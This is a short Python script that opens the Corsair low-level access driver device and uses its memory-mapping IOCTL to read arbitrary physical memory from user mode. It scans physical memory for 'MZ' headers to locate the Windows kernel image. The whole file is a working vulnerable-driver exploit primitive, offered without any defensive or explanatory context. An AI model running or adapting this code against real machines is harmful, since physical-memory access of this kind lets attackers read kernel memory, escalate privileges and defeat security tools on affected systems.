
import ctypes
import struct

IOCTL_MAP_PHYS_MEM = 0x00225374
PAGE_SIZE = 0x1000
kernel32 = ctypes.WinDLL("kernel32", use_last_error=True)

def map_and_read(h, pa):
    inp = struct.pack("<QII", pa & ~0xFFF, PAGE_SIZE, 0)
    out = ctypes.c_uint64(0)
    ret = ctypes.c_uint32(0)
    ok = kernel32.DeviceIoControl(h, IOCTL_MAP_PHYS_MEM, inp, 16, ctypes.byref(out), 8, ctypes.byref(ret), None)
    if ok and out.value:
        try:
            return bytes((ctypes.c_ubyte * 16).from_address(out.value + (pa & 0xFFF)))
        except:
            return None
    return None

def main():
    h = kernel32.CreateFileW(r"\\.\CorsairLLAccess64", 0xC0000000, 7, None, 3, 0x80, None)
    if h == -1: return

    # ntoskrnl usually at 0x200000, 0x400000, 0x800000, etc.
    for pa in range(0x0, 0x20000000, 0x200000):
        data = map_and_read(h, pa)
        if data and data[:2] == b"MZ":
             print(f"MZ at 0x{pa:X}")
    kernel32.CloseHandle(h)

if __name__ == "__main__":
    main()
